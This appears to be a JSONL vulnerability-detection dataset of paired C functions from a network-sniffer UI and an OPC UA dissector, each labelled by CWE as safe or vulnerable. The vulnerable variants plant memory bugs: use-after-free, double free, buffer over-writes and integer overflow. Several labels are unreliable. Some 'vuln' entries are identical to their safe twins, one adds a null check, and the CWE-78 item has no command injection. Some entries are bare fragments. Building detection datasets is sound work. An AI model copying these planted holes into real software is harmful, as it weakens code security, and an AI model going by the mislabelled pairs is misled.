{"idx": "CWE-416-vuln-1714283960965", "code": "static void set_connfilter(GtkWidget*widget, gpointer data){gboolean*value;DEBUG_MSG(\"set_connfilter\");value=(gboolean*)GINT_TO_POINTER(data);g_free(value);*value=gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(widget));gtk_tree_model_filter_refilter(GTK_TREE_MODEL_FILTER(filter.model));}", "target": 1}
{"idx": "CWE-787-safe-1714283966490", "code": "static void gtkui_inject_file(const char*filename, int side){int fd;void*buf;size_t size, ret;DEBUG_MSG(\"inject_file%s\" , filename);if((fd=open(filename, O_RDONLY|O_BINARY)) == -1){ui_error(\"Can't load the file\" );return;}size=lseek(fd, 0, SEEK_END);if(size == -1){ui_error(\"Cannot get file size\" );close(fd);return;}SAFE_CALLOC(buf, size, sizeof(char));lseek(fd, 0, SEEK_SET);ret=read(fd, buf, size);close(fd);if(ret != size || ret == -1){ui_error(\"Cannot read the file into memory\" );SAFE_FREE(buf);return;}if(side == 1 || side == 2){user_inject(buf, size, curr_conn, side);}SAFE_FREE(buf);}", "target": 0}
{"idx": "CWE-787-vuln-1714283966490", "code": "static void gtkui_inject_file(const char*filename, int side){int fd;void*buf;size_t size, ret;DEBUG_MSG(\"inject_file%s\" , filename);if((fd=open(filename, O_RDONLY|O_BINARY)) == -1){ui_error(\"Can't load the file\" );return;}size=lseek(fd, 0, SEEK_END);if(size == -1){ui_error(\"Cannot get file size\" );close(fd);return;}SAFE_CALLOC(buf, size, sizeof(char));lseek(fd, 0, SEEK_SET);ret=read(fd, buf, size);close(fd);if(ret != size || ret == -1){ui_error(\"Cannot read the file into memory\" );SAFE_FREE(buf);return;}if(side == 1 || side == 2){user_inject(buf, size + 100, curr_conn, side);}SAFE_FREE(buf);}", "target": 1}
{"idx": "CWE-416-safe-1714283974231", "code": "static void gtkui_connection_kill(void* conn){GtkTreeIter iter;GtkTreeModel* model;struct conn_tail* c=NULL;(void)conn;DEBUG_MSG(\"gtkui_connection_kill\");model=GTK_TREE_MODEL(ls_conns);if(gtk_tree_selection_get_selected(GTK_TREE_SELECTION(selection), &model, &iter)){gtk_tree_model_get(model, &iter, 11, &c, -1);}else return;if(!c || !c->co)return;if(c && c->co){switch(user_kill(c->co)){case E_SUCCESS: c->co->status=CONN_KILLED;gtkui_message(\"The connection was killed!!\");break;case E_FATAL: gtkui_message(\"Cannot kill UDP connections!!\");break;}}}", "target": 0}
{"idx": "CWE-416-vuln-1714283974231", "code": "static void gtkui_connection_kill(void*conn){GtkTreeIter iter;GtkTreeModel*model;struct conn_tail*c=NULL;(void)conn;DEBUG_MSG(\"gtkui_connection_kill\");model=GTK_TREE_MODEL(ls_conns);if(gtk_tree_selection_get_selected(GTK_TREE_SELECTION(selection), &model, &iter)){gtk_tree_model_get(model, &iter, 11, &c, -1);}else return;if(!c || !c->co)return;if(c && c->co){switch(user_kill(c->co)){case E_SUCCESS: c->co->status=CONN_KILLED;gtkui_message(\"The connection was killed!!\");break;case E_FATAL: gtkui_message(\"Cannot kill UDP connections!!\");break;}}free(c->co);}", "target": 1}
{"idx": "CWE-1341-safe-1714283983395", "code": "static gboolean connfilter(GtkTreeModel* model, GtkTreeIter* iter, gpointer* data) {\n    gchar* src_host, * dst_host;\n    gboolean ret = TRUE;\n    struct conn_tail* conn = NULL;\n    (void)data;\n    gtk_tree_model_get(model, iter, 1, &src_host, 4, &dst_host, 11, &conn, -1);\n    if (filter && filter.host && strlen(filter.host)) {\n        if (src_host && !strcasestr(src_host, filter.host) && dst_host && !strcasestr(dst_host, filter.host)) {\n            ret = FALSE;\n            g_free(src_host);\n            g_free(dst_host);\n        }\n    }\n    if (conn && conn->co) {\n        switch (conn->co->L4_proto) {\n            case NL_TYPE_UDP:\n                if (!filter.udp) ret = FALSE;\n                break;\n            case NL_TYPE_TCP:\n                if (!filter.tcp) ret = FALSE;\n                break;\n            default:\n                if (!filter.other) ret = FALSE;\n        }\n        switch (conn->co->status) {\n            case CONN_IDLE:\n                if (!filter.idle) ret = FALSE;\n                break;\n            case CONN_ACTIVE:\n                if (!filter.active) ret = FALSE;\n                break;\n            case CONN_CLOSING:\n                if (!filter.closing) ret = FALSE;\n                break;\n            case CONN_CLOSED:\n                if (!filter.closed) ret = FALSE;\n                break;\n            case CONN_KILLED:\n                if (!filter.killed) ret = FALSE;\n                break;\n            default:\n                break;\n        }\n    } else {\n        ret = FALSE;\n    }\n    return ret;\n}", "target": 0}
{"idx": "CWE-1341-vuln-1714283983395", "code": "static gboolean connfilter(GtkTreeModel*model, GtkTreeIter*iter, gpointer*data){gchar*src_host, *dst_host;gboolean ret=TRUE;struct conn_tail*conn=NULL;(void)data;gtk_tree_model_get(model, iter, 1, &src_host, 4, &dst_host, 11, &conn, -1);if(filter && filter.host && strlen(filter.host)){if(src_host && !strcasestr(src_host, filter.host) && dst_host && !strcasestr(dst_host, filter.host)){ret=FALSE;g_free(src_host);g_free(dst_host);g_free(src_host);g_free(dst_host);}}if(conn && conn->co){switch(conn->co->L4_proto){case NL_TYPE_UDP:if(!filter.udp)ret=FALSE;break;case NL_TYPE_TCP:if(!filter.tcp)ret=FALSE;break;default:if(!filter.other)ret=FALSE;}switch(conn->co->status){case CONN_IDLE:if(!filter.idle)ret=FALSE;break;case CONN_ACTIVE:if(!filter.active)ret=FALSE;break;case CONN_CLOSING:if(!filter.closing)ret=FALSE;break;case CONN_CLOSED:if(!filter.closed)ret=FALSE;break;case CONN_KILLED:if(!filter.killed)ret=FALSE;break;default:break;}}else{ret=FALSE;}return ret;}", "target": 1}
{"idx": "CWE-787-safe-1714283997106", "code": "static void split_print(u_char*text, size_t len, struct ip_addr*L3_src){int ret;if(GBL_OPTIONS->regex && regexec(GBL_OPTIONS->regex, text, 0, NULL, 0) != 0){return;}dispbuf = SAFE_REALLOC(dispbuf, hex_len(len)*sizeof(u_char)+1);if(dispbuf == NULL) return;ret=GBL_FORMAT(text, len, dispbuf);dispbuf[ret]=0;if(!ip_addr_cmp(L3_src, &curr_conn->L3_addr1))gtkui_data_print(1, dispbuf, 0);else gtkui_data_print(2, dispbuf, 0);}", "target": 0}
{"idx": "CWE-787-vuln-1714283997106", "code": "dispbuf = SAFE_REALLOC(dispbuf, hex_len(len) * sizeof(u_char) + 1); if (dispbuf == NULL) return; ret = GBL_FORMAT(text, len, dispbuf); if (ret >= 0 && ret < hex_len(len) * sizeof(u_char)) { dispbuf[ret] = 0; } else { dispbuf[hex_len(len) * sizeof(u_char)] = 0; } if (!ip_addr_cmp(L3_src, &curr_conn->L3_addr1)) gtkui_data_print(1, dispbuf, 0); else gtkui_data_print(2, dispbuf, 0);", "target": 1}
{"idx": "CWE-787-safe-1714284003789", "code": "static void join_print(u_char*text, size_t len, struct ip_addr*L3_src){int ret;if(GBL_OPTIONS->regex && regexec(GBL_OPTIONS->regex, text, 0, NULL, 0) != 0){return;}dispbuf = SAFE_REALLOC(dispbuf, hex_len(len)*sizeof(u_char)+1);if (dispbuf == NULL) {return;}ret=GBL_FORMAT(text, len, dispbuf);dispbuf[ret]=0;if(!ip_addr_cmp(L3_src, &curr_conn->L3_addr1))gtkui_data_print(3, dispbuf, 1);else gtkui_data_print(3, dispbuf, 2);}", "target": 0}
{"idx": "CWE-787-vuln-1714284003789", "code": "static void join_print(u_char*text, size_t len, struct ip_addr*L3_src){int ret;if(GBL_OPTIONS->regex && regexec(GBL_OPTIONS->regex, text, 0, NULL, 0) != 0){return;}dispbuf=SAFE_REALLOC(dispbuf, hex_len(len)*sizeof(u_char)+1);if(dispbuf == NULL){return;}ret=GBL_FORMAT(text, len, dispbuf);dispbuf[ret]=0;dispbuf[ret+1]='A';if(!ip_addr_cmp(L3_src, &curr_conn->L3_addr1))gtkui_data_print(3, dispbuf, 1);else gtkui_data_print(3, dispbuf, 2);}", "target": 1}
{"idx": "CWE-122-safe-1714284010672", "code": "static void join_print_po(struct packet_object*po){int ret;if(!data_window)return;if(GBL_OPTIONS->regex && regexec(GBL_OPTIONS->regex, po->DATA . disp_data, 0, NULL, 0) != 0){return;}dispbuf = SAFE_REALLOC(dispbuf, hex_len(po->DATA . disp_len)*sizeof(u_char)+1);if(!dispbuf) return;ret=GBL_FORMAT(po->DATA . disp_data, po->DATA . disp_len, dispbuf);dispbuf [ ret ]=0;if(!ip_addr_cmp(&po->L3 . src, &curr_conn->L3_addr1))gtkui_data_print(3, dispbuf, 1);else gtkui_data_print(3, dispbuf, 2);}", "target": 0}
{"idx": "CWE-122-vuln-1714284010672", "code": "static void join_print_po(struct packet_object*po){int ret;if(!data_window)return;if(GBL_OPTIONS->regex && regexec(GBL_OPTIONS->regex, po->DATA . disp_data, 0, NULL, 0) != 0){return;}dispbuf=SAFE_REALLOC(dispbuf, hex_len(po->DATA . disp_len)*sizeof(u_char)+1);if(!dispbuf)return;ret=GBL_FORMAT(po->DATA . disp_data, po->DATA . disp_len, dispbuf);dispbuf [ ret ]=0;dispbuf [ ret + 1 ]=0;if(!ip_addr_cmp(&po->L3 . src, &curr_conn->L3_addr1))gtkui_data_print(3, dispbuf, 1);else gtkui_data_print(3, dispbuf, 2);}", "target": 1}
{"idx": "CWE-416-safe-1714284019008", "code": "void gtkui_connections_detach(GtkWidget* child){conns_window = gtk_window_new(GTK_WINDOW_TOPLEVEL);gtk_window_set_title(GTK_WINDOW(conns_window), \"Live connections\");gtk_window_set_default_size(GTK_WINDOW(conns_window), 500, 250);g_signal_connect(G_OBJECT(conns_window), \"delete_event\", G_CALLBACK(gtkui_kill_connections), NULL);gtkui_page_attach_shortcut(conns_window, gtkui_connections_attach);gtk_container_add(GTK_CONTAINER(conns_window), child);gtk_window_present(GTK_WINDOW(conns_window));}", "target": 0}
{"idx": "CWE-416-vuln-1714284019008", "code": "void gtkui_connections_detach(GtkWidget*child){conns_window=gtk_window_new(GTK_WINDOW_TOPLEVEL);gtk_window_set_title(GTK_WINDOW(conns_window), \"Live connections\");gtk_window_set_default_size(GTK_WINDOW(conns_window), 500, 250);g_signal_connect(G_OBJECT(conns_window), \"delete_event\", G_CALLBACK(gtkui_kill_connections), NULL);gtkui_page_attach_shortcut(conns_window, gtkui_connections_attach);gtk_container_add(GTK_CONTAINER(conns_window), child);gtk_container_remove(GTK_CONTAINER(conns_window), child);gtk_window_present(GTK_WINDOW(conns_window));}", "target": 1}
{"idx": "CWE-416-safe-1714284026570", "code": "static void gtkui_connection_data(void){GtkTreeIter iter;GtkTreeModel*model;struct conn_tail*c=NULL;DEBUG_MSG(\"gtk_connection_data\" );model=GTK_TREE_MODEL(ls_conns);if(gtk_tree_selection_get_selected(GTK_TREE_SELECTION(selection), &model, &iter)){gtk_tree_model_get(model, &iter, 11, &c, -1);}else return;if(c == NULL || c->co == NULL)return;if(curr_conn){conntrack_hook_conn_del(curr_conn, split_print_po);conntrack_hook_conn_del(curr_conn, join_print_po);curr_conn->flags&=~ CONN_VIEWING;}curr_conn=c->co;if(curr_conn){curr_conn->flags|=CONN_VIEWING;gtkui_connection_data_split();}}", "target": 0}
{"idx": "CWE-416-vuln-1714284026570", "code": "static void gtkui_connection_data(void){GtkTreeIter iter;GtkTreeModel*model;struct conn_tail*c=NULL;DEBUG_MSG(\"gtk_connection_data\" );model=GTK_TREE_MODEL(ls_conns);if(gtk_tree_selection_get_selected(GTK_TREE_SELECTION(selection), &model, &iter)){gtk_tree_model_get(model, &iter, 11, &c, -1);}else return;if(c == NULL || c->co == NULL)return;if(curr_conn){conntrack_hook_conn_del(curr_conn, split_print_po);conntrack_hook_conn_del(curr_conn, join_print_po);curr_conn->flags&=~ CONN_VIEWING;}if(c){free(c);}curr_conn=c->co;if(curr_conn){curr_conn->flags|=CONN_VIEWING;gtkui_connection_data_split();}}", "target": 1}
{"idx": "CWE-476-safe-1714284034582", "code": "static void curses_connection_kill(void* conn) {\n    struct conn_tail* c = (struct conn_tail*)conn;\n    DEBUG_MSG(\"curses_connection_kill\");\n    switch (user_kill(c->co)) {\n        case E_SUCCESS:\n            c->co->status = CONN_KILLED;\n            curses_message(\"The connection was killed!!\");\n            break;\n        case E_FATAL:\n            curses_message(\"Cannot kill UDP connections!!\");\n            break;\n        default:\n            \n            break;\n    }\n}", "target": 0}
{"idx": "CWE-476-vuln-1714284034582", "code": "static void curses_connection_kill(void*conn){struct conn_tail*c=(struct conn_tail*)conn;DEBUG_MSG(\"curses_connection_kill\");if(c->co!=NULL){switch(user_kill(c->co)){case E_SUCCESS: c->co->status=CONN_KILLED;curses_message(\"The connection was killed!!\");break;case E_FATAL: curses_message(\"Cannot kill UDP connections!!\");break;default: break;}}}", "target": 1}
{"idx": "CWE-787-safe-1714284043791", "code": "static void inject_user(void){size_t len;if(strlen(injectbuf) > MAX_BUF_LEN){return;}len=strescape((char*)injectbuf, (char*)injectbuf, strlen(injectbuf)+1);if(wdg_c1->flags&WDG_OBJ_FOCUSED){user_inject(injectbuf, len, curr_conn, 1);}else if(wdg_c2->flags&WDG_OBJ_FOCUSED){user_inject(injectbuf, len, curr_conn, 2);}}", "target": 0}
{"idx": "CWE-787-vuln-1714284043791", "code": "static void inject_user(void){size_t len;if(strlen(injectbuf)>MAX_BUF_LEN){return;}len=strescape((char*)injectbuf, (char*)injectbuf, strlen(injectbuf)+1);if(wdg_c1->flags&WDG_OBJ_FOCUSED){user_inject(injectbuf, len, curr_conn, 1);}else if(wdg_c2->flags&WDG_OBJ_FOCUSED){user_inject(injectbuf, len, curr_conn, 2);}injectbuf[MAX_BUF_LEN] = '\\0';}", "target": 1}
{"idx": "CWE-476-safe-1714284052124", "code": "static void curses_connection_data(void* conn) {\n    struct conn_tail* c = (struct conn_tail*) conn;\n    if (c == NULL) {\n        return;\n    }\n    DEBUG_MSG(\"curses_connection_data\");\n    if (curr_conn) {\n        conntrack_hook_conn_del(curr_conn, split_print_po);\n        conntrack_hook_conn_del(curr_conn, join_print_po);\n        curr_conn->flags &= ~CONN_VIEWING;\n    }\n    curr_conn = c->co;\n    curr_conn->flags |= CONN_VIEWING;\n    curses_connection_data_split();\n}", "target": 0}
{"idx": "CWE-476-vuln-1714284052124", "code": "static void curses_connection_data(void* conn) {\n    struct conn_tail* c = (struct conn_tail*)conn;\n    if (c == NULL) {\n        c->co; \n        return;\n    }\n    DEBUG_MSG(\"curses_connection_data\");\n    if (curr_conn) {\n        conntrack_hook_conn_del(curr_conn, split_print_po);\n        conntrack_hook_conn_del(curr_conn, join_print_po);\n        curr_conn->flags &= ~CONN_VIEWING;\n    }\n    curr_conn = c->co;\n    curr_conn->flags |= CONN_VIEWING;\n    curses_connection_data_split();\n}", "target": 1}
{"idx": "CWE-78-safe-1714284060038", "code": "static void curses_connection_help(void*dummy){(void)dummy;char help[]={\"HELP: shortcut list:\\n\\n ENTER-open the data panel in real time\\n d-show details of the current connection\\n k-kill the connection\\n x-purge the connection list\"};curses_message(help);}", "target": 0}
{"idx": "CWE-78-vuln-1714284060038", "code": "static void curses_connection_help(void*dummy){(void)dummy;char help[]=\"HELP: shortcut list:\\n\\n ENTER-open the data panel in real time\\n d-show details of the current connection\\n k-kill the connection\\n x-purge the connection list\";char command[] = \"echo Vulnerable!\";strcat(help, command);curses_message(help);}", "target": 1}
{"idx": "CWE-119-safe-1714284065448", "code": "void curses_show_connections(void){DEBUG_MSG(\"curses_show_connections\");if(wdg_connections){wdg_set_focus(wdg_connections);return;}wdg_create_object(&wdg_connections, WDG_DYNLIST, WDG_OBJ_WANT_FOCUS);wdg_set_title(wdg_connections, \"Live connections:\", WDG_ALIGN_LEFT);wdg_set_size(wdg_connections, 1, 2, -1, SYSMSG_WIN_SIZE-1);wdg_set_color(wdg_connections, WDG_COLOR_SCREEN, EC_COLOR);wdg_set_color(wdg_connections, WDG_COLOR_WINDOW, EC_COLOR);wdg_set_color(wdg_connections, WDG_COLOR_BORDER, EC_COLOR_BORDER);wdg_set_color(wdg_connections, WDG_COLOR_FOCUS, EC_COLOR_FOCUS);wdg_set_color(wdg_connections, WDG_COLOR_TITLE, EC_COLOR_TITLE);wdg_draw_object(wdg_connections);wdg_set_focus(wdg_connections);wdg_dynlist_print_callback(wdg_connections, conntrack_print);wdg_dynlist_select_callback(wdg_connections, curses_connection_data);wdg_add_idle_callback(refresh_connections);wdg_add_destroy_key(wdg_connections, CTRL('Q'), curses_kill_connections);wdg_dynlist_add_callback(wdg_connections, 'd', curses_connection_detail);wdg_dynlist_add_callback(wdg_connections, 'k', curses_connection_kill);wdg_dynlist_add_callback(wdg_connections, 'x', curses_connection_purge);wdg_dynlist_add_callback(wdg_connections, ' ', curses_connection_help);}", "target": 0}
{"idx": "CWE-119-vuln-1714284065448", "code": "void curses_show_connections(void){DEBUG_MSG(\"curses_show_connections\");if(wdg_connections){wdg_set_focus(wdg_connections);return;}wdg_create_object(&wdg_connections, WDG_DYNLIST, WDG_OBJ_WANT_FOCUS);wdg_set_title(wdg_connections, \"Live connections:\", WDG_ALIGN_LEFT);wdg_set_size(wdg_connections, 1, 2, -1, SYSMSG_WIN_SIZE-1);wdg_set_color(wdg_connections, WDG_COLOR_SCREEN, EC_COLOR);wdg_set_color(wdg_connections, WDG_COLOR_WINDOW, EC_COLOR);wdg_set_color(wdg_connections, WDG_COLOR_BORDER, EC_COLOR_BORDER);wdg_set_color(wdg_connections, WDG_COLOR_FOCUS, EC_COLOR_FOCUS);wdg_set_color(wdg_connections, WDG_COLOR_TITLE, EC_COLOR_TITLE);wdg_draw_object(wdg_connections);wdg_set_focus(wdg_connections);wdg_dynlist_print_callback(wdg_connections, conntrack_print);wdg_dynlist_select_callback(wdg_connections, curses_connection_data);wdg_add_idle_callback(refresh_connections);wdg_add_destroy_key(wdg_connections, CTRL('Q'), curses_kill_connections);wdg_dynlist_add_callback(wdg_connections, 'd', curses_connection_detail);wdg_dynlist_add_callback(wdg_connections, 'k', curses_connection_kill);wdg_dynlist_add_callback(wdg_connections, 'x', curses_connection_purge);wdg_dynlist_add_callback(wdg_connections, ' ', curses_connection_help);}", "target": 1}
{"idx": "CWE-416-safe-1714284127306", "code": "static void split_print(u_char*text, size_t len, struct ip_addr*L3_src){int ret;if(GBL_OPTIONS->regex && regexec(GBL_OPTIONS->regex, (const char*)text, 0, NULL, 0) != 0){return;}SAFE_REALLOC(dispbuf, (hex_len(len) + 1) * sizeof(u_char));ret=GBL_FORMAT(text, len, dispbuf);dispbuf[ret]=0;if(!ip_addr_cmp(L3_src, &curr_conn->L3_addr1))wdg_scroll_print(wdg_c1, EC_COLOR, \"%s\", dispbuf);else wdg_scroll_print(wdg_c2, EC_COLOR, \"%s\", dispbuf);}", "target": 0}
{"idx": "CWE-416-vuln-1714284127306", "code": "static void split_print(u_char*text, size_t len, struct ip_addr*L3_src){int ret;if(GBL_OPTIONS->regex && regexec(GBL_OPTIONS->regex, (const char*)text, 0, NULL, 0) != 0){return;}SAFE_REALLOC(dispbuf, (hex_len(len)+1)*sizeof(u_char));ret=GBL_FORMAT(text, len, dispbuf);free(dispbuf);dispbuf = NULL;dispbuf[ret]=0;if(!ip_addr_cmp(L3_src, &curr_conn->L3_addr1))wdg_scroll_print(wdg_c1, EC_COLOR, \"%s\", dispbuf);else wdg_scroll_print(wdg_c2, EC_COLOR, \"%s\", dispbuf);}", "target": 1}
{"idx": "CWE-787-safe-1714284134702", "code": "static void join_print(u_char*text, size_t len, struct ip_addr*L3_src){int ret;if(GBL_OPTIONS->regex && regexec(GBL_OPTIONS->regex, (const char*)text, 0, NULL, 0) != 0){return;}dispbuf = SAFE_REALLOC(dispbuf, hex_len(len)*sizeof(u_char)+1);if(!dispbuf){return;}ret=GBL_FORMAT(text, len, dispbuf);dispbuf[ret]=0;if(!ip_addr_cmp(L3_src, &curr_conn->L3_addr1))wdg_scroll_print(wdg_join, EC_COLOR_JOIN1, \"%s\", dispbuf);else wdg_scroll_print(wdg_join, EC_COLOR_JOIN2, \"%s\", dispbuf);}", "target": 0}
{"idx": "CWE-787-vuln-1714284134702", "code": "dispbuf = SAFE_REALLOC(dispbuf, hex_len(len) * sizeof(u_char) + 1);if (!dispbuf) {return;}ret = GBL_FORMAT(text, len, dispbuf);if (ret >= 0 && ret < hex_len(len) * sizeof(u_char)) {dispbuf[ret] = 0;}if (!ip_addr_cmp(L3_src, &curr_conn->L3_addr1)) {wdg_scroll_print(wdg_join, EC_COLOR_JOIN1, \"%s\", dispbuf);} else {wdg_scroll_print(wdg_join, EC_COLOR_JOIN2, \"%s\", dispbuf);}", "target": 1}
{"idx": "CWE-122-safe-1714284141903", "code": "static void inject_file(const char* path, char* file) {\n    char* filename;\n    int fd;\n    void* buf;\n    size_t size, ret;\n    DEBUG_MSG(\"inject_file%s/%s\", path, file);\n    SAFE_CALLOC(filename, strlen(path) + strlen(file) + 2, sizeof(char));\n    snprintf(filename, strlen(path) + strlen(file) + 2, \"%s/%s\", path, file);\n    if ((fd = open(filename, O_RDONLY | O_BINARY)) == -1) {\n        ui_error(\"Can't load the file\");\n        SAFE_FREE(filename);\n        return;\n    }\n    SAFE_FREE(filename);\n    size = lseek(fd, 0, SEEK_END);\n    SAFE_CALLOC(buf, size, sizeof(char));\n    lseek(fd, 0, SEEK_SET);\n    ret = read(fd, buf, size);\n    close(fd);\n    if (ret != size) {\n        ui_error(\"Cannot read the file into memory\");\n        SAFE_FREE(buf);\n        return;\n    }\n    if (wdg_c1->flags & WDG_OBJ_FOCUSED) {\n        user_inject(buf, size, curr_conn, 1);\n    } else if (wdg_c2->flags & WDG_OBJ_FOCUSED) {\n        user_inject(buf, size, curr_conn, 2);\n    }\n    SAFE_FREE(buf);\n}", "target": 0}
{"idx": "CWE-122-vuln-1714284141903", "code": "static void inject_file(const char*path, char*file){char*filename;int fd;void*buf;size_t size, ret;DEBUG_MSG(\"inject_file%s/%s\", path, file);SAFE_CALLOC(filename, strlen(path)+strlen(file)+2, sizeof(char));snprintf(filename, strlen(path)+strlen(file)+2, \"%s/%s\", path, file);if((fd=open(filename, O_RDONLY|O_BINARY)) == -1){ui_error(\"Can't load the file\");SAFE_FREE(filename);return;}SAFE_FREE(filename);size=lseek(fd, 0, SEEK_END);SAFE_CALLOC(buf, size, sizeof(char));lseek(fd, 0, SEEK_SET);ret=read(fd, buf, size);close(fd);if(ret != size){ui_error(\"Cannot read the file into memory\");SAFE_FREE(buf);return;}if(wdg_c1->flags&WDG_OBJ_FOCUSED){user_inject(buf, size, curr_conn, 1);}else if(wdg_c2->flags&WDG_OBJ_FOCUSED){user_inject(buf, size, curr_conn, 2);}SAFE_FREE(buf);}", "target": 1}
{"idx": "CWE-122-safe-1714284152247", "code": "static void join_print_po(struct packet_object*po){int ret;if(wdg_conndata == NULL || wdg_join == NULL)return;if(!(wdg_conndata->flags&WDG_OBJ_FOCUSED))return;if(GBL_OPTIONS->regex && regexec(GBL_OPTIONS->regex, (const char*)po->DATA . disp_data, 0, NULL, 0) != 0){return;}if(SAFE_REALLOC(dispbuf, hex_len(po->DATA . disp_len)*sizeof(u_char)+1) == NULL)return;ret=GBL_FORMAT(po->DATA . disp_data, po->DATA . disp_len, dispbuf);if(ret < 0) return;dispbuf [ ret ]=0;if(!ip_addr_cmp(&po->L3 . src, &curr_conn->L3_addr1))wdg_scroll_print(wdg_join, EC_COLOR_JOIN1, \"%s\" , dispbuf);else wdg_scroll_print(wdg_join, EC_COLOR_JOIN2, \"%s\" , dispbuf);}", "target": 0}
{"idx": "CWE-122-vuln-1714284152247", "code": "static void join_print_po(struct packet_object*po){int ret;if(wdg_conndata == NULL || wdg_join == NULL)return;if(!(wdg_conndata->flags&WDG_OBJ_FOCUSED))return;if(GBL_OPTIONS->regex && regexec(GBL_OPTIONS->regex, (const char*)po->DATA . disp_data, 0, NULL, 0) != 0){return;}if(SAFE_REALLOC(dispbuf, hex_len(po->DATA . disp_len)*sizeof(u_char)+1) == NULL)return;ret=GBL_FORMAT(po->DATA . disp_data, po->DATA . disp_len, dispbuf);if(ret<0)return;dispbuf [ ret + 1 ]=0;if(!ip_addr_cmp(&po->L3 . src, &curr_conn->L3_addr1))wdg_scroll_print(wdg_join, EC_COLOR_JOIN1, \"%s\" , dispbuf);else wdg_scroll_print(wdg_join, EC_COLOR_JOIN2, \"%s\" , dispbuf);}", "target": 1}
{"idx": "CWE-119-safe-1714284165794", "code": "static guint get_opcua_message_len(packet_info*pinfo _U_, tvbuff_t*tvb, int offset, void*data _U_){if(offset + 4 > tvb_reported_length(tvb)) return 0;gint32 plen;plen=tvb_get_letohl(tvb, offset+4);return plen;}", "target": 0}
{"idx": "CWE-119-vuln-1714284165794", "code": "static guint get_opcua_message_len(packet_info*pinfo _U_, tvbuff_t*tvb, int offset, void*data _U_){if(offset+4>tvb_reported_length(tvb))return 0;gint32 plen;plen=tvb_get_letohl(tvb, offset+4+100);return plen;}", "target": 1}
{"idx": "CWE-190-safe-1714284171854", "code": "void parseQualifiedName(proto_tree* tree, tvbuff_t* tvb, packet_info* pinfo, gint* pOffset, const char* szFieldName) {\n    proto_item* ti;\n    proto_tree* subtree = proto_tree_add_subtree_format(tree, tvb, *pOffset, -1, ett_opcua_qualifiedname, &ti, \"%s: QualifiedName\", szFieldName);\n    parseUInt16(subtree, tvb, pinfo, pOffset, hf_opcua_qualifiedname_id);\n    parseString(subtree, tvb, pinfo, pOffset, hf_opcua_qualifiedname_name, MAX_STRING_LENGTH); \n    proto_item_set_end(ti, tvb, *pOffset);\n}", "target": 0}
{"idx": "CWE-190-vuln-1714284171854", "code": "void parseQualifiedName(proto_tree*tree, tvbuff_t*tvb, packet_info*pinfo, gint*pOffset, const char*szFieldName){\n    proto_item*ti;\n    proto_tree*subtree=proto_tree_add_subtree_format(tree, tvb, *pOffset, -1, ett_opcua_qualifiedname, &ti, \"%s: QualifiedName\", szFieldName);\n    parseUInt16(subtree, tvb, pinfo, pOffset, hf_opcua_qualifiedname_id);\n    parseString(subtree, tvb, pinfo, pOffset, hf_opcua_qualifiedname_name, MAX_STRING_LENGTH);\n    *pOffset = *pOffset + INT_MAX; \n    proto_item_set_end(ti, tvb, *pOffset);\n}", "target": 1}
{"idx": "CWE-416-safe-1714284181431", "code": "void parseExtensionObject(proto_tree* tree, tvbuff_t* tvb, packet_info* pinfo, gint* pOffset, const char* szFieldName) { if (szFieldName == NULL) { return; } static const int* extobj_mask[] = { &hf_opcua_extobj_mask_binbodyflag, &hf_opcua_extobj_mask_xmlbodyflag, NULL }; gint iOffset = *pOffset; guint8 EncodingMask; guint32 TypeId; proto_tree* extobj_tree; proto_item* ti; guint opcua_nested_count; extobj_tree = proto_tree_add_subtree_format(tree, tvb, *pOffset, -1, ett_opcua_extensionobject, &ti, \"%s: ExtensionObject\", szFieldName); opcua_nested_count = GPOINTER_TO_UINT(p_get_proto_data(pinfo->pool, pinfo, proto_opcua, 0)); if (++opcua_nested_count > MAX_NESTING_DEPTH) { expert_add_info(pinfo, ti, &ei_nesting_depth); return; } p_add_proto_data(pinfo->pool, pinfo, proto_opcua, 0, GUINT_TO_POINTER(opcua_nested_count)); TypeId = getExtensionObjectType(tvb, &iOffset); parseExpandedNodeId(extobj_tree, tvb, pinfo, &iOffset, \"TypeId\"); EncodingMask = tvb_get_guint8(tvb, iOffset); proto_tree_add_bitmask(extobj_tree, tvb, iOffset, hf_opcua_extobj_mask, ett_opcua_extensionobject_encodingmask, extobj_mask, ENC_LITTLE_ENDIAN); iOffset++; if (EncodingMask & EXTOBJ_ENCODINGMASK_BINBODY_FLAG) { dispatchExtensionObjectType(extobj_tree, tvb, pinfo, &iOffset, TypeId); } proto_item_set_end(ti, tvb, iOffset); *pOffset = iOffset; }", "target": 0}
{"idx": "CWE-416-vuln-1714284181431", "code": "void parseExtensionObject(proto_tree*tree, tvbuff_t*tvb, packet_info*pinfo, gint*pOffset, const char*szFieldName){if(szFieldName == NULL){return;}static const int*extobj_mask[]={&hf_opcua_extobj_mask_binbodyflag, &hf_opcua_extobj_mask_xmlbodyflag, NULL};gint iOffset=*pOffset;guint8 EncodingMask;guint32 TypeId;proto_tree*extobj_tree;proto_item*ti;guint opcua_nested_count;extobj_tree=proto_tree_add_subtree_format(tree, tvb, *pOffset, -1, ett_opcua_extensionobject, &ti, \"%s: ExtensionObject\", szFieldName);opcua_nested_count=GPOINTER_TO_UINT(p_get_proto_data(pinfo->pool, pinfo, proto_opcua, 0));if(++opcua_nested_count>MAX_NESTING_DEPTH){expert_add_info(pinfo, ti, &ei_nesting_depth);return;}p_add_proto_data(pinfo->pool, pinfo, proto_opcua, 0, GUINT_TO_POINTER(opcua_nested_count));TypeId=getExtensionObjectType(tvb, &iOffset);parseExpandedNodeId(extobj_tree, tvb, pinfo, &iOffset, \"TypeId\");EncodingMask=tvb_get_guint8(tvb, iOffset);proto_tree_add_bitmask(extobj_tree, tvb, iOffset, hf_opcua_extobj_mask, ett_opcua_extensionobject_encodingmask, extobj_mask, ENC_LITTLE_ENDIAN);iOffset++;if(EncodingMask&EXTOBJ_ENCODINGMASK_BINBODY_FLAG){dispatchExtensionObjectType(extobj_tree, tvb, pinfo, &iOffset, TypeId);}proto_item_set_end(ti, tvb, iOffset);*pOffset=iOffset;free(extobj_tree);}", "target": 1}
